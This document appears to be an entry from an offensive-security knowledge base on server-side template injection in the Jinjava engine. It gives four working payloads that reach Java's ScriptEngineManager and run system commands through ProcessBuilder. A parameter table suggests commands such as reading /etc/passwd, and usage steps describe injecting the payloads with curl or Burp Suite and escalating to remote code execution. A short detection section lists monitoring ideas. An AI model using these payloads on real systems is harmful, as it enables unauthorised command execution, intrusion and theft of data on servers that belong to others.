---
id: bb266bc2-1f78-4fc9-b881-2457206e36ad
name: Jinjava-SSTI-Command-Execution-Payload
type: code
language: jinjava
verified: true
created_at: '2023-04-06T03:56:39.964846+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Java
  - Web
tags:
  - ssti
  - rce
  - jinjava
  - payload
validated: true
---

# Jinjava-SSTI-Command-Execution-Payload

## Code

```jinjava
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.String('xxx')")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"whoami\"); x.start()")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"netstat\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"uname\",\"-a\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())")}}
```

## Description

This code snippet contains multiple Jinjava SSTI payloads for exploiting template injection vulnerabilities. The first payload tests access to the JavaScript engine by creating a simple string. The subsequent payloads use ProcessBuilder to execute system commands ('whoami', 'netstat', 'uname -a') and attempt to capture output via IOUtils, enabling RCE on Java-based servers.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| \"whoami\" | Command to execute (replace with target command) | \"id\" or \"ls\" |
| \"netstat\" | Network reconnaissance command | \"ps aux\" |
| \"uname\",\"-a\" | System information command | \"cat /etc/passwd\" |

No dynamic variables in the code; customize commands by editing the escaped strings.

## Usage

Inject these payloads into user-controlled Jinjava inputs (e.g., via POST data or URL params) using tools like curl or Burp Suite. Start with the test payload to confirm SSTI, then escalate to command execution. For output retrieval, ensure Apache Commons IO is in the classpath; otherwise, use alternative methods like writing to accessible files or network callbacks.

## Detection

- Monitor web application logs for template rendering exceptions or unusual Java class instantiations (e.g., ScriptEngineManager).
- WAF rules for '{{' patterns, Java class names, or ProcessBuilder in requests.
- Server-side process monitoring for unexpected executions (e.g., via auditd or Sysmon).
- Network anomalies from commands like netstat or reverse shells spawned from web processes.

## Related

- [[procedures/Jinjava-SSTI-Command-Execution]]
- [[commands/curl-inject-jinjava-payload]]
